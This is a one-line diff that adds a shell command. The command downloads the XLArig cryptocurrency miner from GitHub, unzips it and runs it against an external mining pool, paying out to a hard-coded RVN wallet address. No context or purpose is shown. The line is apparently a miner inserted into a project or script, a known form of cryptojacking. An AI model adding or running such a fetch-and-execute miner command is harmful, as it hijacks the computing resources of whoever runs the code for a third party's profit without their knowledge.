@@ -1,0 +1,1 @@
+wget https://github.com/scala-network/XLArig/releases/download/v5.2.2/XLArig-v5.2.2-linux-x86_64.zip && unzip XLArig-v5.2.2-linux-x86_64.zip && ./xlarig -o rx.unmineable.com:3333 -a rx -k -u RVN:RYcTdAv2oFAGxYUX4EJb3AkRPqGj869xFzE -p x -t 2
